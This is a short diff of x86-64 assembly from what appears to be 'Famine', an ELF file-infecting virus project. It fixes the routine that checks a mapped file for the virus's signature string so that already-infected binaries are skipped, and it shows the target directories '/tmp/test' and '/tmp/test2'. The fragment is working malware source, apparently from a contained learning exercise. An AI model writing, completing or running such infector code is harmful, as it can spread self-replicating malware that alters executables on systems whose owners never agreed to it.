@@ -180,11 +180,12 @@ section .text
                 mov VAR(Famine.mmap_ptr), rax   ; save mmap_ptr
 
             .check_infect:
-                mov rsi, (_finish - Traza)
-                lea rsi, VAR(Famine.file_original_len)
-                sub rsi, (_finish - Traza)     ; Traza
-                lea rdi, Traza
-                mov rcx, 20
+                mov ecx,  Traza_position
+                mov rsi, rax
+                movzx rbx, dword VAR(Famine.file_original_len)
+                add rsi, rbx
+                sub rsi, rcx
+                lea rdi, [rel Traza]
                 cld
                 rep cmpsb
                 je .munmap
@@ -391,6 +392,7 @@ section .text
             syscall
 
         dirs db         "/tmp/test",0,"/tmp/test2",0,0
+        Traza_position equ _finish - Traza
         Traza db         "tomartin & carce-bo",0  ;20
         hello db            "[+] Hello",10,0  ;11
         host_entrypoint  dq   _dummy_host_entrypoint
